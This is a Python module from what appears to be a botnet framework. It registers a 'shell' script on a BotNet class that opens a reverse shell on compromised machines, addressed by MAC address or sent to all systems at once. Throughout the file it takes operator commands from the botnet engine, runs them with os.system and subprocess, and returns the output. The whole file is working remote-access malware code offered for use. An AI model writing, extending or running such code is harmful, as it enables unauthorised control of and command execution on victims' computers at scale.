import os
import time
import threading
import subprocess


from .. import BotNet, Request


@BotNet.default_script(script_version="0.0.1")
def shell(request: Request, *cmd_args) -> str:
    """
    `[mac-address] /shell` -> shell session
    or 
    `[mac-address] /shell [command]`-> run command and exit

    example input command:
         `94945035671481 /shell`  \n 
         `94945035671481 /shell ls .`\n
         `94945035671481 /shell ping google.com -c 10`
        or
         `/shell ping google.com -c 10` -> run command in all systems
"""
    engine = request.engine

    if not len(cmd_args) == 0:
        res = _cmd(cmd_args, engine, timeout=10)
        if not res == None:
            engine.send(res)
        return

    repeat = 0
    time_out = 500
    sleep_time = 2
    exit_code = "TIME_OUT"

    engine.send(f"start reverse shell\nfor EXIT send `exit`", request.sytsem_data)

    while repeat < time_out:

        command = engine.receive()

        if not _valid_command(command):
            if repeat == 0:
                engine.send(f"{os.getcwd()}=>")
            time.sleep(sleep_time)
            repeat += 1
            continue

        if command[0] == "exit":
            exit_code = "0"
            break

        else:
            res = _cmd(command, engine, timeout=10)
            if not res == None:
                engine.send(res)
            engine.send(f"{os.getcwd()}=>")

    return f"reverse shell EXIT [{exit_code}]"


def _valid_command(command) -> bool:
    if type(command) != list:
        return False

    if len(command) < 1:
        return False

    if command[0].startswith("/"):
        return False

    return True


def _ls(command:list[str]) -> str:
    if len(command) >= 2:
        path = command[1]
    else:
        path = '.'
        
    try:
        return os.listdir(path)

    except FileNotFoundError as error:
        return error
    except Exception as error:
        return error

def _cd(command:list[str]) -> str:
    if len(command) >= 2:
            path = command[1]
    else:
        path = ' '
    
    try:
        os.chdir(path)
        return None

    except FileNotFoundError as error:
        return error
    except Exception as error:
        return error


def _cmd(command:list[str], engine, timeout:int=10):
    """Run commands."""

    if command[0] in ("ls", "dir"):
        return _ls(command)

    elif command[0] == "cd":
        return _cd(command)

    elif command[0] in ("mkdir", "touch", "rm", "rmdir"):
        os_result = os.system(" ".join(command))
        return f'output code "{os_result}"'

    else:
        tread = threading.Thread(target=_runcommand_in_thread, args=[command, engine])
        tread.start()

        for i in range(timeout):
            if tread.is_alive():
                time.sleep(1)
                continue
            else:
                return None
        
        return "Your command is running in the background and you will get the results when it is done."
        

def _runcommand_in_thread(command:list[str], engine):
    try:
        result = subprocess.getoutput(" ".join(command))
        if type(result) == bytes:
            result = result.decode()
        engine.send(result)

    except Exception as e:
        engine.send(e)
        